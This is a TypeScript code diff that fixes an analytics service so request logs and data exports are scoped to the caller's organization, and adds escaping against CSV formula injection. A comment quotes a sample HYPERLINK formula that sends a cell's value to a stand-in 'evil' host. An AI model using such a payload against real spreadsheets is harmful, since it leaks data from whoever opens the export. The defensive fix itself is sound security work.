@@ -129,8 +129,22 @@ export class AnalyticsService {
   }
 
   async getRequestLogs(query: RequestLogQuery) {
+    // CRITICAL: RequestLog has no direct `organizationId` column — the
+    // only link is via its `gateway` relation. The previous query was
+    // unscoped, so any authenticated caller could see every request
+    // log in the database across every organization.
+    //
+    // Scope via INNER JOIN on gateway so a request log only shows up
+    // for members of the gateway's org. A request log with no
+    // associated gateway (system-level / health-check traffic) is
+    // never returned through this endpoint.
+    if (!query.organizationId) {
+      throw new Error('getRequestLogs requires organizationId');
+    }
     const qb = this.requestLogRepository
       .createQueryBuilder('log')
+      .innerJoin('log.gateway', 'gw')
+      .andWhere('gw.organizationId = :orgId', { orgId: query.organizationId })
       .orderBy('log.timestamp', 'DESC')
       .skip((query.page - 1) * query.limit)
       .take(query.limit);
@@ -487,15 +501,28 @@ export class AnalyticsService {
   }
 
   async exportData(query: ExportQuery): Promise<any> {
+    // Every export type MUST be org-scoped. Without this, an
+    // authenticated user could download every request log / tool
+    // execution / LLM session across every org in the database.
+    if (!query.organizationId) {
+      throw new Error('exportData requires organizationId');
+    }
     const from = query.from || new Date(Date.now() - 30 * 24 * 60 * 60 * 1000);
     const to = query.to || new Date();
 
     if (query.type === 'requests') {
-      const logs = await this.requestLogRepository.find({
-        where: { timestamp: Between(from, to) },
-        order: { timestamp: 'DESC' },
-        take: 10000,
-      });
+      // Same JOIN-via-gateway scoping as getRequestLogs, because
+      // RequestLog has no direct organizationId column. Use a
+      // query builder instead of the repository's find() so we can
+      // add the inner join cleanly.
+      const logs = await this.requestLogRepository
+        .createQueryBuilder('log')
+        .innerJoin('log.gateway', 'gw')
+        .where('gw.organizationId = :orgId', { orgId: query.organizationId })
+        .andWhere('log.timestamp BETWEEN :from AND :to', { from, to })
+        .orderBy('log.timestamp', 'DESC')
+        .take(10000)
+        .getMany();
 
       if (query.format === 'csv') {
         return this.toCsv(logs, [
@@ -552,16 +579,40 @@ export class AnalyticsService {
   private toCsv(data: any[], columns: string[]): string {
     const header = columns.join(',');
     const rows = data.map(item =>
-      columns.map(col => {
-        const val = item[col];
-        if (val === null || val === undefined) return '';
-        const str = String(val);
-        return str.includes(',') || str.includes('"') || str.includes('\n')
-          ? `"${str.replace(/"/g, '""')}"`
-          : str;
-      }).join(','),
+      columns.map(col => this.escapeCsvCell(item[col])).join(','),
     );
     return [header, ...rows].join('\n');
+  }
+
+  /**
+   * Escape a CSV cell value. Handles two separate concerns:
+   *
+   *   1. Syntax quoting (the standard RFC 4180 rule): wrap in double
+   *      quotes and double any embedded quotes when the cell contains
+   *      `,`, `"`, `\r`, or `\n`.
+   *
+   *   2. Formula injection mitigation: a cell whose first character is
+   *      `=`, `+`, `-`, `@`, `\t`, or `\r` will be interpreted as a
+   *      formula by Excel / LibreOffice Calc / Google Sheets when the
+   *      CSV is opened. An attacker could craft a tool name like
+   *      `=HYPERLINK("http://evil/?"&A1,"click")` and steal another
+   *      cell's value when an admin exports the CSV. We prepend a
+   *      single quote (`'`) to any such cell. This is the standard
+   *      OWASP mitigation for CSV injection.
+   */
+  private escapeCsvCell(val: any): string {
+    if (val === null || val === undefined) return '';
+    let str = String(val);
+
+    // Formula-injection mitigation BEFORE syntax quoting.
+    if (str.length > 0 && /^[=+\-@\t\r]/.test(str)) {
+      str = `'${str}`;
+    }
+
+    if (str.includes(',') || str.includes('"') || str.includes('\n') || str.includes('\r')) {
+      return `"${str.replace(/"/g, '""')}"`;
+    }
+    return str;
   }
 
   private getTimeframeDate(timeframe: string): Date {
